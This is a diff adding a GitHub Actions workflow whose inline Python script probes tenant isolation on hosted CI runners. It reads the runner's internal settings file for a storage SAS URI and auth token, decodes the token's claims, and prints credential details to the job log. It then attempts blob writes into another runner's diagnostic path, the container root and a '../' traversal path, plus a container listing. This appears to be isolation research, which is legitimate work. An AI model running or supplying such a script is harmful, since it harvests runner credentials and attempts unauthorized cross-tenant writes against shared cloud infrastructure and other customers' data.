@@ -1,0 +1,71 @@
+name: probe_v76_sasshare
+on:
+  workflow_dispatch:
+jobs:
+  sasshare:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sas-container-sharing
+        continue-on-error: true
+        run: |
+          python3 - <<'PYEOF'
+          import json, base64, urllib.request, urllib.error, uuid
+
+          s=json.load(open('/opt/hca/.settings'))
+          sas=s['diagnosticsSasUri']
+          tok=s['authToken']
+          def b64ud(x):
+              x+='='*(-len(x)%4); return base64.urlsafe_b64decode(x)
+          claims=json.loads(b64ud(tok.split('.')[1])); wid=claims.get('wid','')
+
+          base=sas.split('?')[0]; qs=sas.split('?')[1] if '?' in sas else ''
+          # base = https://{account}.blob.core.windows.net/{container}[/{prefix...}]
+          after=base.split('.blob.core.windows.net/')[-1]
+          account=base.split('//')[1].split('.')[0]
+          container=after.split('/')[0]
+          embedded_prefix='/'.join(after.split('/')[1:])
+          qd=dict(p.split('=',1) for p in qs.split('&') if '=' in p)
+          print('SAS_ACCOUNT='+account)
+          print('SAS_CONTAINER='+container)
+          print('SAS_EMBEDDED_PREFIX='+embedded_prefix)
+          print('SAS_PARAMS sp=%s sr=%s se=%s sktid=%s skoid=%s' % (qd.get('sp'),qd.get('sr'),qd.get('se'),qd.get('sktid'),qd.get('skoid')))
+          print('IS_USER_DELEGATION='+('YES (skoid present)' if qd.get('skoid') else 'NO (account-key SAS)'))
+          print('TOKEN_WID='+wid)
+          # heuristic: is the container name a GUID (per-alloc) or static/regional (shared)?
+          import re
+          isguid=bool(re.fullmatch(r'[0-9a-fA-F-]{32,36}', container))
+          print('CONTAINER_LOOKS_LIKE=%s' % ('GUID/per-allocation (isolation likely)' if isguid else 'STATIC/regional name (SHARED candidate)'))
+
+          contbase='https://%s.blob.core.windows.net/%s' % (account, container)
+          def put(blobpath, label):
+              url='%s/%s?%s' % (contbase, blobpath.lstrip('/'), qs)
+              r=urllib.request.Request(url, data=b'v76-canary', method='PUT')
+              r.add_header('x-ms-blob-type','BlockBlob')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=15); st=resp.status; b=''
+              except urllib.error.HTTPError as e:
+                  st=e.code; b=e.read(160).decode('utf-8','replace')
+              except Exception as e:
+                  st='ERR'; b=str(e)[:80]
+              flag=' <<< WROTE OUTSIDE OWN PREFIX' if (isinstance(st,int) and 200<=st<300 and 'OWN' not in label) else ''
+              print('  PUT [%-22s] %-40s -> %s%s | %s' % (label, blobpath[:40], st, flag, b[:70].replace(chr(10),' ')))
+
+          print('=== WRITE MATRIX (sr=c => SAS grants whole-container write; testing reach) ===')
+          put((embedded_prefix+'/' if embedded_prefix else '')+'own_%s.txt'%uuid.uuid4().hex[:8], 'OWN-prefix baseline')
+          # sibling: a DIFFERENT wid's diagnostic path (would belong to another runner if container is shared)
+          other_wid='{azure-westus-general-%s}:{%s}:{%s}' % (uuid.uuid4(),uuid.uuid4(),uuid.uuid4())
+          put('%s/diagnostics/probe_%s.txt'%(other_wid,uuid.uuid4().hex[:6]), 'sibling-wid path')
+          put('probe_root_%s.txt'%uuid.uuid4().hex[:6], 'container-root path')
+          put('../%s/escape_%s.txt'%(container,uuid.uuid4().hex[:6]), 'traversal-attempt')
+
+          print('=== LIST attempt (sp=acw has no l => expect 403/AuthorizationFailure) ===')
+          lurl='%s?restype=container&comp=list&%s' % (contbase, qs)
+          try:
+              resp=urllib.request.urlopen(lurl,timeout=15); print('  LIST -> %s len=%d' % (resp.status, len(resp.read())))
+          except urllib.error.HTTPError as e:
+              print('  LIST -> %s | %s' % (e.code, e.read(150).decode('utf-8','replace')[:90]))
+          except Exception as e:
+              print('  LIST -> ERR %s' % str(e)[:80])
+          print('=== INTERPRET: same SAS_CONTAINER across two different runs/allocations => SHARED => sibling writes are cross-tenant integrity. Unique GUID per run => isolated => refute. ===')
+          print('=== DONE ===')
+          PYEOF
